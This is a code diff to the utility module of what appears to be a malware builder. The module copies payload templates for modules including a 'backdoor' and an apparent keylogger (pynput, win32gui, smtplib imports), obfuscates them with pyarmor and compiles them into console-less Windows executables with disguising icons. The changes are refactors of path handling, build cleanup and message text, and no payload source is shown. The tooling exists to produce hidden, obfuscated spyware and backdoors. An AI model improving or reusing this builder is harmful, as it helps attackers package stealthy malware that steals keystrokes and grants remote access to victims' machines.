@@ -1,4 +1,5 @@
 import os
+import shutil
 from ..variables.variables import *
 from ..utils.utils import *
 
@@ -99,11 +100,7 @@ class ModuleUtils(Utils):
         """
         try:
             self.clear()
-            if OS == "windows":
-                payload_path: str = f"packages\\payloads\\{kwargs["module"]}\\{kwargs["payload"]}"
-            else:
-                payload_path: str = f"./packages/payloads/{kwargs["module"]}/{kwargs["payload"]}"
-
+            payload_path : str = os.path.join("packages", "payloads", kwargs["module"], kwargs["payload"])
             payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))
         
             match str(kwargs["module"]).lower():
@@ -125,11 +122,12 @@ class ModuleUtils(Utils):
                             file.write(file_content)
                             
                 case _:
-                    raise ValueError(self.write(message="Invalid Module", level=4))
+                    raise ValueError(self.write(message="Invalid Module.", level=4))
         
         except FileNotFoundError:
             os.remove(kwargs["name"])
-            self.write(message=f"Payload named {kwargs["payload"]} not found", level=4, clear=True)
+            
+            self.write(message=f"Payload named {kwargs["payload"]} not found.", level=4, clear=True)
             sys.exit(1)
 
     def obfuscate(self, name : str) -> None:
@@ -143,7 +141,7 @@ class ModuleUtils(Utils):
             os.system(f"pyarmor gen {name}")
 
         except Exception as e:
-            self.write(message=f"ERROR: {str(e)}", level=4)
+            self.write(message=f"ERROR: {str(e)}.", level=4)
     
     def convert_to_exe(self, module : str, name : str, icon_path : str) -> None:
         """
@@ -161,15 +159,15 @@ class ModuleUtils(Utils):
                         icon_option = f"--icon={icon_path}" if icon_path else ""
                         os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                                 --hidden-import=smtplib --hidden-import=email.mime.multipart --hidden-import=email.mime.text --hidden-import=email.mime.base \
-                                --hidden-import=email --hidden-import=threading --hidden-import=pyarmor --hidden-import=pywin32 --hidden-import=tempfile --noconsole --clean {icon_option} .\\dist\\{name}")
+                                --hidden-import=email --hidden-import=threading --hidden-import=pyarmor --hidden-import=tempfile --noconsole --clean {icon_option} .\\dist\\{name}")
                     else:
                         icon_option = f"--icon={icon_path}" if icon_path else ""
                         os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                                 --hidden-import=smtplib --hidden-import=threading --hidden-import=pyarmor --hidden-import=email.mime.multipart --hidden-import=email.mime.text \
-                                --hidden-import=email.mime.base --hidden-import=email --hidden-import=pywin32 --hidden-import=tempfile --noconsole {icon_option} ./dist/{name}")
+                                --hidden-import=email.mime.base --hidden-import=email --hidden-import=tempfile --noconsole {icon_option} ./dist/{name}")
                 
                 except Exception as e:
-                    self.write(f"ERROR: {str(e)}", type=4)
+                    self.write(f"ERROR: {str(e)}.", type=4)
                     
             case "backdoor":
                 try:
@@ -183,7 +181,7 @@ class ModuleUtils(Utils):
                                 --hidden-import=os --hidden-import=base64 --hidden-import=pyarmor --noconsole {icon_option} ./dist/{name}")
                 
                 except Exception as e:
-                    self.write(f"ERROR: {str(e)}", type=4)
+                    self.write(f"ERROR: {str(e)}.", type=4)
                 
             case _:
                 raise ValueError(self.write("Invalid module.", level=4))
@@ -196,23 +194,18 @@ class ModuleUtils(Utils):
             name (str): The name of the file.
             module (str): The name of the module used.
         """
-        if OS == "windows":
-            os.remove(name)
-            os.remove(f"dist\\{name}")
-            
-        else:
-            os.remove(name)
-            os.remove(f"dist/{name}")
-
-        os.remove(name.replace("py", "spec"))
-        exe_location = name.replace(".py", ".exe")
-        exe_loc = os.path.abspath(exe_location)
-        self.dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
-        if OS == "windows":
-            self.write(message=f"{module.capitalize()} Was Created On this Location: {self.dist_folder}\\dist\\{exe_location}", level=4, clear=True)
-
-        else:
-            self.write(message=f"{module.capitalize()} Was Created On this Location: {self.dist_folder}/dist/{exe_location}", level=4, clear=True)
+        self.name_exe = name.replace(".py", ".exe")
+        self.exe_location = os.path.abspath(self.name_exe)
+        self.parent_folder = os.path.abspath(os.path.join(self.exe_location, os.pardir))
+        
+        os.remove(os.path.join(self.parent_folder, name))
+        os.remove(os.path.join(self.parent_folder, "dist", name))
+        os.remove(os.path.join(self.parent_folder, name.replace("py", "spec")))
+        
+        shutil.rmtree(os.path.join(self.parent_folder, "dist", "pyarmor_runtime_000000"))
+        shutil.rmtree(os.path.join(self.parent_folder, "build", name.replace(".py", "")))
+        
+        self.write(message=f"{module.capitalize()} Was Created On this Location: {os.path.join(self.parent_folder, "dist", self.name_exe)}", level=4, clear=False)
             
     def list_payloads(self, module : str) -> list[str]:
         """
@@ -226,7 +219,7 @@ class ModuleUtils(Utils):
         """
         try:
             self.clear()
-            payloads : list[str] = os.listdir(f"./packages/payloads/{module}/")
+            payloads : list[str] = os.listdir(os.path.join("packages", "payloads", module))
             print(f"""{COLOR['CYAN']}
                 ╔══════════════════════════════════════════════════════════════════════════╗
                 ║*                               - PAYLOADS -                             *║
@@ -253,4 +246,4 @@ class ModuleUtils(Utils):
             self.list_payloads(module)
         
         except Exception as e:
-            self.write(message=f"ERROR: {str(e)}", level=4, clear=True)
+            self.write(message=f"ERROR: {str(e)}.", level=4, clear=True)
